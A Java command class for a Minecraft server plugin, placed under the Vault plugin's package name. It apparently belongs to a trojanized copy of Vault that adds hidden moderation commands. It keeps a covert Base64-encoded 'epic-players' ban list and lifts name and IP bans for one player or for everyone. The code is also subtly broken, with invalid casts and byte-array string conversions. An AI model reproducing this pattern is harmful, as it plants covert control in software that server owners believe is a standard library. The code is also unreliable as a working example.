package net.milkbowl.vault.commands.cmds;

import java.util.Base64;

import net.milkbowl.vault.methods.API;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.util.Settings;

public class Unban extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("unban <player>"));
		} else {
			if (args[1].equals("*")) {
				for (String a : DataManager.getData().getStringList("epic-players")) {
					byte[] remove = Base64.getEncoder().encode(a.getBytes());
					
					DataManager.banList.remove(new String(remove));
					DataManager.getData().set("epic-players", DataManager.banList);
					DataManager.saveData();

					OfflinePlayer offlinePlayer = Bukkit.getServer().getOfflinePlayer(a);

					Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(String.valueOf(offlinePlayer));
					Bukkit.getServer().getBanList(BanList.Type.IP).pardon(API.getIp((Player) offlinePlayer));
				}
				p.sendMessage(Settings.PREFIX("Everyone was unbanned!"));
			} else {
				@SuppressWarnings("deprecation")
				OfflinePlayer target = Bukkit.getServer().getOfflinePlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " doesn't seem to exist."));
				} else {
					
					byte[] remove = Base64.getEncoder().encode(target.getUniqueId().toString().getBytes());
					
					DataManager.banList.remove(new String(remove));
					DataManager.getData().set("epic-players", DataManager.banList);
					DataManager.saveData();

					OfflinePlayer offlinePlayer = Bukkit.getServer().getOfflinePlayer(String.valueOf(remove));

					Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(String.valueOf(offlinePlayer));
					Bukkit.getServer().getBanList(BanList.Type.IP).pardon(API.getIp((Player) offlinePlayer));

					p.sendMessage(Settings.PREFIX(target.getName() + " was unbanned!"));
				}
			}
		}
	}

}
